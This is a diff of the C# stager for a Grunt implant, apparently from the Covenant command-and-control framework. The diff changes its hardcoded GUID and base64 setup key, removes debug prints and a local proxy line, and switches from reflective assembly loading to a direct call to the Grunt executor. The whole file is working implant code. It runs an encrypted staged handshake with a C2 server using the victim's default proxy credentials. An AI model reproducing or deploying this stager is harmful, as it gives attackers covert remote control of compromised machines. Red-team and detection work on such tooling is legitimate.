@@ -3,6 +3,8 @@ using System.Net;
 using System.Linq;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.IO.Pipes;
+using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Cryptography;
 
@@ -46,9 +48,9 @@ namespace GruntStager
                 bool UseCertPinning = bool.Parse(@"true");
 
                 Random random = new Random();
-                string aGUID = @"bc0f3fe620";
+                string aGUID = @"4f1d416599";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
-                byte[] SetupKeyBytes = Convert.FromBase64String(@"BfJbIWbLeTzEB7Ltjt894lte2TKmovi1fbYZM784dZk=");
+                byte[] SetupKeyBytes = Convert.FromBase64String(@"uXbZeSndos6wCISDRCcsztO4JD9CXc3ZpSsQUlCsE/M=");
                 string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
 
                 Aes SetupAESKey = Aes.Create();
@@ -85,7 +87,6 @@ namespace GruntStager
                 wc.UseDefaultCredentials = true;
                 wc.Proxy = WebRequest.DefaultWebProxy;
                 wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
-                //wc.Proxy = new WebProxy("http://192.168.107.1:8080", false);
                 string CovenantURI = "";
                 foreach (string uri in CovenantURIs)
                 {
@@ -101,8 +102,6 @@ namespace GruntStager
                     }
                 }
                 for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
-                // Stage 0
-                Console.WriteLine("Stage 0");
                 Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
                 string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
@@ -127,8 +126,7 @@ namespace GruntStager
                 rng.GetBytes(challenge1);
                 byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                 hash = hmac.ComputeHash(EncryptedChallenge1);
-                // Stage 1
-                Console.WriteLine("Stage 1");
+
                 string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
                 transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
 
@@ -155,8 +153,7 @@ namespace GruntStager
                 SessionKey.GenerateIV();
                 byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                 hash = hmac.ComputeHash(EncryptedChallenge2);
-                // Stage 1
-                Console.WriteLine("Stage 2");
+
                 string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                 transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
 
@@ -172,9 +169,9 @@ namespace GruntStager
                 messageBytes = Convert.FromBase64String(message64str);
                 if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                 SessionKey.IV = Convert.FromBase64String(iv64str);
-                // byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
-                // Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
-                // gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
+                /*byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
+                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
+                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });*/
                 GruntExecutor.Grunt.Execute(CovenantURI
                     , CovenantCertHash
                     , GUID
@@ -188,8 +185,8 @@ namespace GruntStager
                     , ValidateCert
                     , UseCertPinning);
             }
-            catch (Exception e) 
-            { 
+            catch (Exception e)
+            {
                 Console.Error.WriteLine(e.Message);
             }
         }
@@ -206,7 +203,6 @@ namespace GruntStager
                 var request = base.GetWebRequest(address) as HttpWebRequest;
                 if (request == null) return base.GetWebRequest(address);
                 request.CookieContainer = CookieContainer;
-                request.Timeout = 1000 * 3600;
                 return request;
             }
         }
